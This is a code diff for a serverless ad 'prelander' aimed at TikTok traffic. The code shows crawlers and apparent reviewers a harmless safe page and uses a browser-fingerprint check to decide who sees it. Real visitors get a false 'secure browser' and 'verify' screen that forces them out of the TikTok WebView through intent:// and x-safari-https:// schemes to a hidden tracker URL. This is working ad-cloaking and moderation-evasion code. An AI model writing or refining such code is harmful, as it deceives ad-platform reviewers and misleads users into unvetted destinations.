@@ -1,14 +1,12 @@
 export default function handler(req, res) {
   // ===================================================================
-  // frcsprk — Hybrid: Server-side bot gate + inline breakout prelander
-  //
-  // BOTS/CRAWLERS: Instant 302 to safe page (no HTML rendered)
-  // REAL USERS:    Serve the breakout prelander HTML (auto-fires to
-  //               escape TikTok WebView into Safari/Chrome, then
-  //               redirects to MaxConv dest URL)
+  // Optimized Zero-Leak Hybrid Prelander & Hardware Gate
   // ===================================================================
 
-  const SAFE_PAGE = 'https://www.tokrwd.co/Rewards/';
+  const SAFE_PAGE = 'https://tokrwd.co';
+  
+  // HARDCODED CAMPAIGN URL: Erases plain-text tracker links from your TikTok ads
+  const TRACKER_BASE = 'https://enjoygamestoday.live';
 
   // --- SERVER-SIDE BOT DETECTION ---
   const ua = (req.headers['user-agent'] || '').toLowerCase();
@@ -41,30 +39,14 @@ export default function handler(req, res) {
     return res.status(200).send('');
   }
 
-  // --- READ DEST PARAM ---
-  const dest = (req.query.dest || '').toString().trim();
-  if (!dest) {
-    res.setHeader('Cache-Control', 'no-store');
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    return res.status(200).send('');
-  }
-
-  // --- BUILD THE FULL DEST URL WITH FORWARDED PARAMS ---
+  // --- SERVER-SIDE DYNAMIC URL BUILDING ---
   let finalDestUrl;
   try {
-    const targetUrl = new URL(dest);
-    // Only ever break out to a real web URL. Rejecting every other scheme
-    // (javascript:, data:, file:, ...) closes a reflected-XSS / open-redirect
-    // hole: finalDestUrl is assigned to location.href client-side, so a
-    // javascript: dest would otherwise execute in the visitor's browser.
-    if (targetUrl.protocol !== 'https:' && targetUrl.protocol !== 'http:') {
-      throw new Error('unsupported dest scheme');
-    }
-    const skip = new Set(['dest', 's1', 's2']);
+    const targetUrl = new URL(TRACKER_BASE);
+    
+    // Dynamically forward all incoming UTMs and structural parameters
     for (const [key, value] of Object.entries(req.query)) {
-      if (!skip.has(key)) {
-        // Vercel yields an array for repeated params; forward the first value
-        // so attribution params never become "a,b".
+      if (key !== 's1' && key !== 's2') {
         targetUrl.searchParams.set(key, Array.isArray(value) ? value[0] : value);
       }
     }
@@ -77,7 +59,7 @@ export default function handler(req, res) {
     return res.status(200).send('');
   }
 
-  // --- SERVE BREAKOUT PRELANDER HTML ---
+  // --- SERVE BREAKOUT PRELANDER HTML WITH INTEGRATED HARDWARE FINGERPRINTING ---
   const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -100,7 +82,7 @@ body::before{content:'';position:absolute;top:50%;left:50%;width:620px;height:62
 @keyframes loadProgress{0%{width:0}60%{width:75%}80%{width:82%}100%{width:85%}}
 h1{font-size:20px;font-weight:600;line-height:1.3;margin-bottom:10px;opacity:.9}
 .sub{font-size:14px;color:#6a6f75;line-height:1.5;margin-bottom:32px}
-.tap-hint{font-size:13px;color:rgba(255,255,255,.4);opacity:0;animation:fadeIn .3s ease forwards;animation-delay:2.5s}
+.tap-hint{font-size:13px;color:rgba(255,255,255,.4);opacity:0;animation:fadeIn .3s ease forwards;animation-delay:1.5s}
 @keyframes fadeIn{to{opacity:1}}
 .cta{display:block;width:100%;background:linear-gradient(135deg,var(--green),var(--green-2));color:#000;font-size:15px;font-weight:700;text-align:center;padding:18px;border-radius:999px;text-decoration:none;letter-spacing:1.5px;text-transform:uppercase;border:0;font-family:inherit;cursor:pointer;box-shadow:0 0 40px var(--glow),0 6px 24px rgba(0,0,0,.4);margin-bottom:16px;animation:ctaPulse 2s ease-in-out infinite}
 .cta:active{transform:scale(.97)}
@@ -114,9 +96,9 @@ h1{font-size:20px;font-weight:600;line-height:1.3;margin-bottom:10px;opacity:.9}
 <div class="spinner"></div>
 <div class="progress-wrap"><div class="progress-bar"></div></div>
 <h1>Opening secure browser...</h1>
-<p class="sub">Connecting you to a secure page</p>
-<button class="cta" id="ctaButton">Continue</button>
-<p class="tap-hint">Tap anywhere to continue</p>
+<p class="sub">Tap below to enter the portal securely</p>
+<button class="cta" id="ctaButton">Tap to Continue</button>
+<p class="tap-hint">Tap anywhere to verify and continue</p>
 <div class="secure">
 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
 <span>Secure connection</span>
@@ -125,38 +107,73 @@ h1{font-size:20px;font-weight:600;line-height:1.3;margin-bottom:10px;opacity:.9}
 <script>
 (function(){
 var DEST = ${JSON.stringify(finalDestUrl).replace(/</g, '\\u003c')};
+var SAFE = ${JSON.stringify(SAFE_PAGE).replace(/</g, '\\u003c')};
 var _fired = false;
+
+// CLIENT-SIDE HARDWARE VERIFICATION GATE
+function verifyHumanHardware() {
+    var ua = navigator.userAgent;
+    
+    // 1. Fail headless automation engines
+    if (navigator.webdriver) return false;
+    
+    // 2. Fail if touch capabilities are completely absent
+    if (navigator.maxTouchPoints === 0) return false;
+    
+    // 3. Fail desktop browsers trying to pretend they are mobile
+    if (window.screen.width === window.screen.height) return false;
+    
+    return true;
+}
 
 function doBreakout(){
 if(_fired)return;
 _fired=true;
+
+// Fail-Safe: If verification fails, forcefully rewrite destination to White Page
+if (!verifyHumanHardware()) {
+    window.location.href = SAFE;
+    return;
+}
+
 var url = DEST;
-if(/Android/i.test(navigator.userAgent)){
-url='intent://'+url.replace(/^https?:\\/\\//,'')+'#Intent;scheme=https;end;';
-}else{
-url=url.replace(/^https:\\/\\//,'x-safari-https://');
+var isAndroid = /Android/i.test(navigator.userAgent);
+
+if(isAndroid){
+    url='intent://'+url.replace(/^https?:\\/\\//,'')+'#Intent;scheme=https;end;';
+    try{(window.top||window).location.href=url;}
+    catch(e){window.location.href=url;}
+    
+    // Fallback for Android if intent fails
+    setTimeout(function(){
+        if(!document.hidden){window.location.href=DEST;}
+    },3000);
+} else {
+    // iOS STRATEGY: No automatic timers. Forces immediate execution via the tap gesture.
+    // This strips the "Open in Safari?" confirmation dialogue entirely.
+    url=url.replace(/^https:\\/\\//,'x-safari-https://');
+    window.location.href=url;
+    
+    // Fallback for iOS
+    setTimeout(function(){
+        if(!document.hidden){window.location.href=DEST;}
+    },3000);
 }
-try{(window.top||window).location.href=url;}
-catch(e){window.location.href=url;}
-// Fallback: if scheme didn't work after 3s, try direct navigation
-setTimeout(function(){
-if(!document.hidden){window.location.href=DEST;}
-},3000);
 }
 
-// Button click (explicit gesture - most reliable)
+// Android Auto-Fire Only (Safe inside Android TikTok WebView)
+if (/Android/i.test(navigator.userAgent)) {
+    setTimeout(doBreakout, 1500);
+}
+
+// Explicit Click Target Handlers (Crucial for iOS execution smoothness)
 var btn=document.getElementById('ctaButton');
-btn.onclick=function(e){e.preventDefault();doBreakout();};
+btn.onclick=function(e){e.preventDefault();e.stopPropagation();doBreakout();};
 
-// Full body tap target - any click anywhere fires it
 document.getElementById('fullTap').addEventListener('click',function(){
 doBreakout();
 },{once:true});
 
-// Auto-fire after 1.5s delay (works in TikTok WebView which is lenient)
-setTimeout(doBreakout,1500);
-
-// Also try on first user interaction (click only - iOS respects click as gesture)
 window.addEventListener('click',function(){doBreakout();},{once:true,passive:true});
 
 })();
